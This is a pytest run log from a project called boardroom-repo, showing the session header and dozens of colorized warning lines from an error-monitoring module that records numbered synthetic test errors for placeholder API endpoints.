============================= test session starts ==============================
platform linux -- Python 3.13.5, pytest-8.3.5, pluggy-1.5.0 -- /home/paul/boardroom-repo/.venv/bin/python
cachedir: .pytest_cache
rootdir: /home/paul/boardroom-repo
configfile: pyproject.toml
plugins: mock-3.14.0, langsmith-0.3.21, cov-6.2.1, Faker-37.4.0, xdist-3.8.0, anyio-4.9.0, asyncio-1.0.0, env-1.1.5
asyncio: mode=Mode.AUTO, asyncio_default_fixture_loop_scope=function, asyncio_default_test_loop_scope=function
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718295Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 642'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 643'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718420Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 644'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718472Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 645'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718521Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 646'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718571Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 647'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718620Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 648'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718670Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 649'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718719Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 650'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 651'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 652'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 653'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718913Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 654'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.718963Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 655'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719013Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 656'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 657'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719177Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 658'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719238Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 659'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719291Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 660'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719342Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 661'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719392Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 662'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719441Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 663'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719490Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 664'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 665'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719588Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 666'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 667'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719686Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 668'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 669'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 670'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719864Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 671'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.719946Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 672'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720005Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 673'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 674'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720108Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 675'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720158Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 676'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.720208Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m14[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 677'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
